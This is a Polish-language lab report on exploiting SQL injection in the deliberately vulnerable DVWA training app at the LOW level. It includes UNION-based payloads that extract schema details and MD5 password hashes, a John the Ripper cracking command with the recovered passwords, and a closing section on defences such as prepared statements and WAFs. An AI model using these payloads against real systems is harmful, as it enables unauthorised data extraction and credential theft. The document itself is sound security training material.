# 💉 DVWA – SQL Injection & Password Cracking (John the Ripper)

> Dokumentacja laboratoryjna z testów penetracyjnych na aplikacji DVWA – poziom bezpieczeństwa LOW. Obejmuje eksploitację SQL Injection, wydobycie hashów haseł oraz ich łamanie przy użyciu John the Ripper.

---

## Zadanie 1 & 2 – Eksploitacja SQL Injection (poziom LOW)

### Przygotowanie środowiska

- Zalogowano się do DVWA i zmieniono poziom bezpieczeństwa na **LOW**.
- Kod źródłowy dla tego poziomu nie posiada żadnych zabezpieczeń — zmienna `$id` jest przekazywana bezpośrednio do zapytania SQL bez filtrowania:

```php
$id = $_GET['id'];
$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>');
```

---

### Atak „Zawsze Prawda"

Wpisano w formularz:

```sql
1' or '1' = '1
```

Skutkuje to wykonaniem zapytania:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' or '1' = '1';
```

**Wynik:** Warunek `WHERE` stał się zawsze prawdziwy — aplikacja wyświetliła **wszystkich użytkowników** w bazie: `admin`, `Gordon Brown`, `Hack Me`, `Pablo Picasso`, `Bob Smith`.

---

### Wydobywanie informacji systemowych (operator UNION)

Poniższe payloady pozwoliły na uzyskanie szczegółowych informacji o systemie:

| Payload | Co zwraca |
|---------|-----------|
| `1' or 1 = 1 union select null, version() #` | Wersja bazy danych |
| `1' or 1 = 1 union select null, user() #` | Aktualny użytkownik bazy |
| `1' or 1 = 1 union select null, database() #` | Nazwa aktywnej bazy danych |
| `1' or 1=0 union select null, table_name from information_schema.tables #` | Lista wszystkich tabel |
| `1' or 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#` | Tabele zaczynające się od `user` |
| `1' or 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users'` | Kolumny tabeli `users` |
| `1' or 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #` | Loginy + hashe MD5 użytkowników |

**Uzyskane dane:**

- Wersja bazy: **5.0.51a-3ubuntu5**
- Nazwa bazy: **dvwa**
- Loginy i hashe MD5 wszystkich użytkowników

---

## Zadanie 3 – Łamanie haseł (John the Ripper)

Na podstawie danych z Zadania 2 utworzono plik `hasla.txt` z hashami MD5 i loginami.

### Uruchomienie ataku

```bash
john --format=raw-md5 hasla.txt
```

### Wyniki – hasła w postaci jawnej

| Login | Hash MD5 | Hasło |
|-------|----------|-------|
| `admin` | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| `smithy` | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| `gordonb` | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| `pablo` | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
| `1337` | `8afe8b57fc43c8a29829370c79d03f16` | `charley` |

> John the Ripper pomyślnie złamał **5 z 5 hashów**.

---

## Zadanie 4 – Eliminacja podatności i mechanizmy obronne

### 🔧 Zabezpieczenie na poziomie kodu

**Zapytania parametryzowane (Prepared Statements)** – najskuteczniejsza metoda:

```php
// ❌ PODATNE (stary kod DVWA)
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";

// ✅ BEZPIECZNE (PDO + Prepared Statements)
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

- **PDO / MySQLi** – stosowanie nowoczesnych bibliotek zamiast przestarzałego `mysql_query`
- **Walidacja danych** – weryfikacja, czy `user_id` jest liczbą całkowitą (`is_numeric()`, `intval()`)
- **Porównanie MEDIUM vs LOW** – DVWA na poziomie MEDIUM używa `mysql_real_escape_string($id)`, co jest lepsze, ale nadal niewystarczające wobec niektórych ataków

### 🛡️ Obrona systemowa (wykrywanie i blokowanie)

| Metoda | Opis |
|--------|------|
| **WAF / IDS / IPS** | Systemy jak **PHPIDS** analizują zapytania pod kątem znaków specjalnych i blokują podejrzany ruch |
| **Monitorowanie logów** | Regularna analiza logów serwera WWW i bazy danych pod kątem błędów składni SQL |
| **Zasada minimalnych uprawnień** | Użytkownik bazy danych aplikacji nie powinien mieć dostępu do tabel systemowych (`information_schema`) |
